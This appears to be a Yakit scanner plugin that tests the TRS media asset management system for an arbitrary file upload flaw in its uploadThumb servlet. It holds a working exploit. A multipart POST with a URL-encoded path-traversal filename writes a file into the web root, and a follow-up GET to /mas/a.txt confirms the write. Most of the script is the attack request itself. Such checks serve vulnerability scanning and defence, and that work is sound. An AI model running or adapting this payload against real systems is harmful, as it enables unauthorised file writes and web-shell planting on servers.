script_name: 拓尔思TRS媒资管理系统 uploadThumb 文件上传漏洞
content:
# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /mas/servlets/uploadThumb?appKey=sv&uploadingId=asd HTTP/1.1
Host: {{params(target)}}
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36

------WebKitFormBoundarySl8siBbmVicABvTX
Content-Disposition: form-data; name="file";
filename="%2e%2e%2fwebapps%2fmas%2fa%2etxt"
Content-Type: application/octet-stream

1111111111111111
------WebKitFormBoundarySl8siBbmVicABvTX--`


packet2 = `GET /mas/a.txt HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

`

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    rsp1,req1,_ = poc.HTTP(packet2, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )


    if str.MatchAllOfSubString(rsp1, `HTTP/1.1 200`) && str.MatchAllOfSubString(rsp1, `11111`){
        yakit.Info("%v found 拓尔思TRS媒资管理系统 uploadThumb 文件上传漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("拓尔思TRS媒资管理系统 uploadThumb 文件上传漏洞"),
        risk.severity("high"),
        risk.titleVerbose("拓尔思TRS媒资管理系统 uploadThumb 文件上传漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
		risk.details("文件地址格式为  " + addr + "/mas/a.txt"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
